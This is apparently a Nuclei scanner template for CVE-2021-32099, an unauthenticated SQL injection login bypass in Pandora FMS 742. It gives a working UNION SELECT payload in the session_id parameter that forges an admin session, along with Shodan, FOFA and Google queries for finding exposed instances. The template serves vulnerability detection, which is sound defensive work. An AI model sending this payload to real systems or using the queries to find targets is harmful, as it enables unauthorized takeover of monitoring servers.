id: CVE-2021-32099

info:
  name: Unauthenticated SQL Injection in Pandora FMS 742
  author: ProjectDiscoveryAI
  severity: critical
  description: A SQL injection vulnerability in the pandora_console component of Artica Pandora FMS 742 allows an unauthenticated attacker to upgrade his unprivileged session via the /include/chart_generator.php session_id parameter, leading to a login bypass.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data or complete takeover of the affected system.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a version that is not vulnerable.
  reference:
    - https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained
    - https://portswigger.net/daily-swig/multiple-vulnerabilities-in-pandora-fms-could-trigger-remote-execution-attack
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/SYRTI/POC_to_review
    - https://github.com/Z0fhack/Goby_POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-32099
    cwe-id: CWE-89
    epss-score: 0.00159
    epss-percentile: 0.53537
    cpe: cpe:2.3:a:artica:pandora_fms:742:*:*:*:*:*:*:*
  metadata:
    vendor: artica
    product: pandora_fms
    shodan-query:
      - http.html:"pandora fms - installation wizard"
      - http.title:"pandora fms"
    fofa-query:
      - body="pandora fms - installation wizard"
      - title="pandora fms"
    google-query: intitle:"pandora fms"

http:
  - method: GET
    path:
      - "{{BaseURL}}/include/chart_generator.php?session_id=a'%20UNION%20SELECT%20'a',1,'id_usuario|s:5:\"admin\";'%20as%20data%20FROM%20tsessions_php%20WHERE%20'1'='1"

    matchers:
      - type: word
        words:
          - "id_usuario|s:5:\"admin\";"
        part: body
